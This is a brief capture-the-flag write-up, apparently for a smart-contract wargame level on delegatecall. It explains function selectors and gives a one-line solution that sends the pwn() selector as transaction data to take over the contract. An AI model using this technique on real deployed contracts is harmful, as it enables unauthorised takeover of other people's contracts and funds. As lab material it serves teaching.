# Logic

Delecatecall function permits to run a nother contract function on the state of the current contract. This feature is powerful, being the foundation of Upgradeable contracts, but how it's said: "With great power comes great responsabilities"

Function ID: represents the first 4 bytes of the encoded hash of the function. In this example to find the hash, we used https://emn178.github.io/online-tools/keccak_256.html with `pwn()` as input

# Solution

```
await sendTransaction({from: player,to: contract.address, data: "0xdd365b8b"})
```